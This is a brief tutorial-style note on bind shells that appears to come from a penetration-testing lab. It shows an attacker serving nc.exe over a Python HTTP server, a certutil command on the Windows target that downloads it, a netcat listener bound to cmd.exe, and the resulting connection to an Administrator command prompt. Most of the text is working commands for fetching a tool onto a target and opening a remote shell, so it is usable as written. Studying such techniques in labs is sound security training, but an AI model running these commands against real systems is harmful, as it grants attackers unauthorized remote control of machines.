# Bind Shell
Bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system. 

```bash
└─# cd /usr/share/windows-binaries

┌──(root㉿attackdefense)-[/usr/share/windows-binaries]
└─# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

On target machine
```bash
certutil -urlcache http://targetIP/nc.exe nc.exe


# All client connected to the listener cmd.exe will be executed
nc.exe -nvlp 1234 -e cmd.exe
```

```bash
└─# nc -nv 10.0.18.80 1234                                                
(UNKNOWN) [10.0.18.80] 1234 (?) open
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>
```